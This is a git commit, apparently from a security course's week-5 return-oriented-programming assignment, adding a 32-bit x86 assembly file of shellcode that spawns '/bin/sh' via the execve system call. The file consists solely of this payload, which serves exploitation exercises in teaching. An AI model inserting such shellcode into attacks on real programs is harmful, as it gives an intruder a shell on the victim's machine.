cbbd466119a3971bf656559f1583cc027631a13e
jsfr <jfrdev@gmail.com>
2014-06-06 11:21:25 +0200

    week5 reassignment

---
+++ handout/week5-rop/reassignment/shellcode.asm
@@ -0,0 +1,13 @@
+bits 32
+    ;; executes "/bin/sh" with no additional args and NULL envp.
+    xor eax, eax
+    push eax
+    mov edx, esp
+    push 0x68732f2f
+    push 0x6e69622f
+    mov ebx, esp
+    push eax
+    push ebx
+    mov ecx, esp
+    mov al, 0xb
+    int 0x80
